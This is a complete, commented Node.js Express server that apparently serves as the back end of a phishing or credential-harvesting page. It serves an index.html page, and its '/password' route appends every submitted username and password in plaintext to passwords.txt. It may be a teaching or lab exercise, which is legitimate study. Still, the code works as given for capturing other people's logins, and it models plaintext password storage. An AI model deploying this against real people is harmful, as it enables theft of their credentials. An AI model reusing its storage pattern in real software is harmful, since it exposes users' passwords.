
const path = require('path');
// Working with files
const fs = require('fs');

const express = require('express')
const app = express()

//for handling HTTP POST requests  
//body-parser extracts the entire body of an incoming request stream and exposes it on req.body 
const bp = require('body-parser')

//parses incoming request bodies in a middleware
app.use(bp.json())
// URL-encoded requests.
// extended: true precises that the req.body object will contain values of any type instead of just strings.
app.use(bp.urlencoded({ extended: true }))


// The app.get() function routes the HTTP GET Requests to the path which is being specified with the specified callback functions.
app.get('/', (req, res) => {
    // Print message to the server side
    console.log('The client tried to enter a website.');
    // Response - return the HTML page 
    res.sendFile(path.join(__dirname, '/index.html'));
});



// The app.post() function routes the HTTP POST requests to the specified path with the specified callback functions
app.post('/password',  (req, res) => {
    // In POST request the information is in the body
    // pull the password and the username that the client entered form the body
    var password = req.body.password;
    var username = req.body.username;
    //Write the given password in the 'password.txt' file & Print a message in the server side
    fs.appendFileSync('passwords.txt', ` userName:${username} password : ${password} \n`);
    console.log(`The client enter password  \nYou can see this password in - passwords.txt`);
    
    res.send("done! you entered a password");
});



app.listen(8080, () => {
    console.log(`WebServer is up. Listening at http://localhost:8080`);

})